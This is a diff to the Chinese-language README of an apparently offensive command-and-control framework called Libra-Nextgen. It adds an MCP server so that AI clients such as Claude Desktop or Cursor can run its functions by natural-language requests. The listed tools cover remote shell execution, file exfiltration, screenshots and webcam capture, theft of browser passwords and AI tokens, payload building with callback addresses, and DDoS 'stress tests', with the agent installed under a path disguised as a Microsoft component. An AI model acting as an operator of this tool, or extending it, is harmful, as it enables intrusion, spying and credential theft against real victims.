@@ -57,7 +57,7 @@ ASP.NET Core WebAPI，包含：
 
 ### Console 页面 (`src/webapp/src/pages/`)
 
-15 个页面模块：
+16 个页面模块：
 
 | 页面            | 路由             | 功能                                              |
 | ------------- | -------------- | ----------------------------------------------- |
@@ -73,6 +73,7 @@ ASP.NET Core WebAPI，包含：
 | Builder       | `/builder`     | 代理载荷编译生成                                        |
 | StressTest    | `/stress-test` | 多点 DDoS 攻击管理与执行                                 |
 | AuditLogs     | `/audit`       | 操作审计日志查询                                        |
+| Settings      | `/settings`    | MCP AccessKey 管理                                 |
 
 ## Agent 功能矩阵
 
@@ -190,6 +191,88 @@ Agent 支持在二进制文件末尾注入 JSON 配置：
   "copyToPath": "Microsoft\\SecurityHealth"
 }
 ```
+
+## MCP 服务器
+
+Libra-Nextgen 内置 [Model Context Protocol (MCP)](https://modelcontextprotocol.io) 服务器，允许 AI 客户端（如 Claude Desktop、Cursor、Windsurf 等）通过标准 MCP 协议直接调用全部 C2 功能。
+
+### 端点
+
+```
+http://localhost:5270/mcp
+```
+
+支持 Streamable HTTP 和 SSE 两种传输方式。
+
+### 鉴权
+
+MCP 服务器使用 AccessKey 鉴权。在请求 Header 中携带：
+
+```
+Authorization: Bearer lnk_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+```
+
+### 创建 AccessKey
+
+1. **通过 Web Console**：登录后进入「设置」页面，点击「创建密钥」，设置名称和（可选的）过期时间。创建成功后立即复制密钥（仅显示一次）。
+
+2. **通过 API**：
+
+```bash
+curl -X POST http://localhost:5270/api/access-keys \
+  -H "Authorization: Bearer <JWT_TOKEN>" \
+  -H "Content-Type: application/json" \
+  -d '{"name": "my-ai-client", "expiresAt": "2025-12-31T00:00:00Z"}'
+```
+
+### 配置 AI 客户端
+
+#### Claude Desktop
+
+在 `claude_desktop_config.json` 中添加：
+
+```json
+{
+  "mcpServers": {
+    "libra-nextgen": {
+      "url": "http://localhost:5270/mcp",
+      "headers": {
+        "Authorization": "Bearer lnk_your_access_key_here"
+      }
+    }
+  }
+}
+```
+
+#### Cursor / Windsurf
+
+在 MCP 配置中添加 HTTP 类型的 MCP 服务器，URL 填写 `http://localhost:5270/mcp`，Header 中设置 `Authorization: Bearer lnk_xxx`。
+
+### 可用工具
+
+MCP 服务器提供以下工具集：
+
+| 工具类别 | 工具 | 说明 |
+|---------|------|------|
+| **Agent** | `list_agents`, `get_agent`, `delete_agent` | 管理在线代理 |
+| **Task** | `list_tasks`, `get_task`, `create_task`, `cancel_task` | 任务调度与管理 |
+| **Shell** | `execute_shell`, `execute_powershell` | 远程命令执行 |
+| **File** | `list_directory`, `get_drives`, `download_file`, `upload_file`, `delete_file`, `rename_file`, `move_file`, `copy_file` | 文件系统操作 |
+| **System** | `get_processes`, `kill_process`, `get_network_info`, `scan_wifi`, `scan_lan` | 系统信息与网络扫描 |
+| **Screen** | `take_screenshot`, `capture_webcam` | 屏幕截图与摄像头 |
+| **Data** | `get_browser_passwords`, `get_browser_history`, `scan_ai_tokens` | 数据窃取 |
+| **Builder** | `build_payload`, `list_builds`, `get_build_info` | 载荷编译 |
+| **Stress** | `start_stress_test`, `stop_stress_test`, `get_campaign_status` | 压力测试 |
+
+### 使用示例
+
+连接成功后，可直接用自然语言与 AI 交互：
+
+- "列出所有在线的 Agent"
+- "在 Agent xxx 上执行 whoami"
+- "截取 Agent xxx 的屏幕截图"
+- "扫描 Agent xxx 所在网络的 WiFi 热点"
+- "构建一个连接到 192.168.1.100:5270 的 Agent 载荷"
 
 ## 许可证
 
